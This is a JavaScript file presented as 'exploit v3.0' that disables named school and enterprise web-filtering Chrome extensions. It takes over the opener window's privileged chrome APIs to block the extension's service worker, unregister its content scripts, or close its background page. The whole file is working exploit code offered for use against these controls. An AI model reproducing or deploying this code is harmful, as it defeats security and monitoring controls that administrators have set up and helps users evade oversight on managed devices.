/**
 * exploit v3.0 for Unblock filterings on Google Chrome
 * - 無断転載及び、作者情報の改ざん、クレジットの削除を禁ずる
 * - Discord Server: https://blogbooks.net/shortlinks/discord/bbs-community
 * - Website: https://blogbooks.net
 * - Github: https://github.com/blogbooks
 * 
 * @author harun#9676 & 半透明のLocaler#5455 & react#1507
 * @license https://oncreative.space/project/blogbooks/exploit.js/LICENCE
 * @copyright (c) 2020-2023 BlogBooks Community
 * @version 3.1
 * 
 */

if (opener && opener.location.protocol == "chrome-extension:" && opener.chrome.extension) {
    document.write("<h2>[exploit.js v3.0 | InterCLASS Filtering Serivce, i-FILTER@Cloud Agent only]</h2><br>| Licence: <a href='https://oncreative.space/project/blogbooks/exploit.js/LICENCE' target='_blank' rel='licence'>https://oncreative.space/project/blogbooks/exploit.js/LICENCE</a><br>| Version: 3.0<br>| Author: BlogBooks Developers<br>| Copyright: (c) 2020-2023 BlogBooks Community & Developers<hr>");

    "use strict";

    function log(text) {
        document.write(`<div style="color: green">${text}</div>`);
    }

    try {
        console.debug("Checking target");
        console.debug(`target: \n| Extension Name: ${opener.chrome.runtime.getManifest().name}\n| Extension ID: ${opener.chrome.runtime.id}`);

        if (opener.chrome.runtime.getManifest().background.service_worker) {
            console.debug(`Found!\n Service Worker - Path: ${opener.chrome.runtime.getURL(opener.chrome.runtime.getManifest().background.service_worker)}`);

            const permissions = opener.chrome.runtime.getManifest().permissions;

            if (permissions.some(permission => permission == "webRequest")) {
                opener.chrome.webRequest.onBeforeRequest.addListener(null, {
                    urls: [
                        `${opener.chrome.runtime.getURL(opener.chrome.runtime.getManifest().background.service_worker)}`
                    ]}, ["blocking"]
                );
                log(`OK! Service Worker was Ejected: ${opener.chrome.runtime.getURL(opener.chrome.runtime.getManifest().background.service_worker)}`);
            }

            if (permissions.some(permission => permission == "scripting")) {
                if (opener.chrome.scripting.getRegisteredContentScripts().then(db => db.length >= 1)) {
                    opener.chrome.scripting.getRegisteredContentScripts()
                        .then(db => {
                            const ids = [];
                            db.forEach(d => ids.push(d.id));
                            opener.chrome.scripting.unregisterContentScripts({"ids": ids});
                        })
                        .then(() => log("OK! ContentScripts was Cleaned."))
                        .catch(e => new Error(`Error: ${e.message}`));
                }
            }
        } else if (opener.chrome.runtime.getManifest().background.scripts) {
            if (opener.chrome.extension.getBackgroundPage()) {
                opener.chrome.extension.getBackgroundPage().close();
                log(`OK! ${opener.chrome.runtime.getManifest().name} was killed.`);
            } else {
                throw new Error("Error: 202 Couldn't Find extension background page");
            }
        } else {
            throw new Error("Error: 201 Unknown Case");
        }
    } catch(e) {
        console.error(e);
        document.write(`<div style="color: red">${e}</div>`);
    }
} else {
    document.write("<div style=\"color: red\"> Error: 101 Couldn't Control Window </div>");
}